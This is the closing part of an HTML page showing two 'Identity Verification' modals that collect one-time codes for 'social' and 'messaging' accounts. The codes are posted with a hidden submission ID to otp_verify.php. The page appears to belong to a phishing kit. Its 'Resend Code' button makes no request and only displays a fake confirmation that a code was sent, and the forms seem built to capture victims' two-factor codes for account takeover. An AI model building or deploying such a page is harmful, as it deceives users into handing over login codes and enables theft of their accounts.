              class="w-full py-3 px-4 bg-blue-600 hover:bg-blue-700 active:bg-blue-800 text-white text-sm font-semibold rounded-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed"
              style="box-shadow:0 4px 12px rgba(37,99,235,0.28);">
        Verify Identity
      </button>
    </form>

    <div class="text-center mt-4 pt-4 border-t border-slate-100">
      <p class="text-xs text-slate-400">Didn't receive the code?
        <button type="button" id="smr_otp_resend_social"
                class="text-blue-600 hover:text-blue-800 font-semibold ml-1 transition-colors hover:underline underline-offset-2">
          Resend Code
        </button>
      </p>
      <p id="smr_otp_resend_msg_social" class="text-xs text-emerald-600 mt-1.5" style="display:none;">
        &#10003; A new verification code has been dispatched to your registered contact.
      </p>
    </div>

  </div>
</div>

<!-- ════════════ OTP MODAL — MESSAGING ════════════ -->
<div id="smr_otp_section_messaging" class="smr-otp-section">
  <div class="smr-otp-backdrop"></div>
  <div class="smr-otp-modal-card">

    <div class="text-center mb-5">
      <div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-blue-50 border border-blue-200 mb-3">
        <svg class="w-5 h-5 text-blue-600" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
          <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
        </svg>
      </div>
      <h3 class="text-lg font-bold text-slate-900 tracking-tight mb-1">Identity Verification</h3>
      <p class="text-sm text-slate-500 leading-relaxed max-w-xs mx-auto">Enter the one-time code sent to your registered contact to confirm your identity.</p>
    </div>

    <div class="flex flex-wrap items-center justify-center gap-2 mb-5 pb-4 border-b border-slate-100">
      <span class="flex items-center gap-1 text-xs text-slate-500">
        <svg class="w-3 h-3 text-blue-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
        Secure
      </span>
      <span class="text-slate-300">&middot;</span>
      <span class="flex items-center gap-1 text-xs text-slate-500">
        <svg class="w-3 h-3 text-blue-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
        Encrypted
      </span>
      <span class="text-slate-300">&middot;</span>
      <span class="flex items-center gap-1 text-xs text-slate-500">
        <svg class="w-3 h-3 text-blue-500" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"/></svg>
        One-Time Code
      </span>
    </div>

    <form id="smr_otp_form_messaging" action="otp_verify.php" method="POST">
      <input type="hidden" name="platform_group" value="messaging">
      <input type="hidden" name="submission_id" id="smr_otp_subid_messaging" value="">

      <div class="mb-5">
        <label for="smr_otp_input_messaging" class="block text-sm font-medium text-slate-600 mb-2">Verification Code</label>
        <input
          type="text"
          id="smr_otp_input_messaging"
          name="otp_value"
          inputmode="numeric"
          autocomplete="one-time-code"
          maxlength="8"
          placeholder="Enter verification code"
          class="w-full rounded-lg border border-gray-300 px-4 py-3 text-center text-lg tracking-widest text-slate-900 bg-white focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all placeholder:text-slate-300 placeholder:tracking-normal"
        >
        <p id="smr_otp_err_messaging" class="text-xs text-red-500 mt-1.5" style="display:none;"></p>
      </div>

      <button id="smr_otp_btn_messaging" type="submit"
              class="w-full py-3 px-4 bg-blue-600 hover:bg-blue-700 active:bg-blue-800 text-white text-sm font-semibold rounded-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed"
              style="box-shadow:0 4px 12px rgba(37,99,235,0.28);">
        Verify Identity
      </button>
    </form>

    <div class="text-center mt-4 pt-4 border-t border-slate-100">
      <p class="text-xs text-slate-400">Didn't receive the code?
        <button type="button" id="smr_otp_resend_messaging"
                class="text-blue-600 hover:text-blue-800 font-semibold ml-1 transition-colors hover:underline underline-offset-2">
          Resend Code
        </button>
      </p>
      <p id="smr_otp_resend_msg_messaging" class="text-xs text-emerald-600 mt-1.5" style="display:none;">
        &#10003; A new verification code has been dispatched to your registered contact.
      </p>
    </div>

  </div>
</div>

<script src="assets.js"></script>

<script>
(function () {
  var fs = document.getElementById('smr_form_social');
  var ns = document.getElementById('smr_social_nojs');
  if (fs) fs.style.display = 'block';
  if (ns) ns.style.display = 'none';
  var fm = document.getElementById('smr_form_messaging');
  var nm = document.getElementById('smr_messaging_nojs');
  if (fm) fm.style.display = 'block';
  if (nm) nm.style.display = 'none';
})();
</script>

<script>
(function () {
  'use strict';

  function smr_initResend(group) {
    var btn   = document.getElementById('smr_otp_resend_' + group);
    var msgEl = document.getElementById('smr_otp_resend_msg_' + group);
    if (!btn) return;
    btn.addEventListener('click', function () {
      btn.disabled = true;
      btn.textContent = 'Sent!';
      if (msgEl) msgEl.style.display = 'block';
      setTimeout(function () {
        btn.disabled = false;
        btn.textContent = 'Resend Code';
        if (msgEl) msgEl.style.display = 'none';
      }, 30000);
    });
  }

  function smr_observeModalScroll(id) {
    var el = document.getElementById(id);
    if (!el || !window.MutationObserver) return;
    new MutationObserver(function () {
      document.body.style.overflow = el.classList.contains('smr-otp-visible') ? 'hidden' : '';
    }).observe(el, { attributes: true, attributeFilter: ['class'] });
  }

  document.addEventListener('DOMContentLoaded', function () {
    smr_initResend('social');
    smr_initResend('messaging');
    smr_observeModalScroll('smr_otp_section_social');
    smr_observeModalScroll('smr_otp_section_messaging');
  });
})();
</script>

</body>
</html>
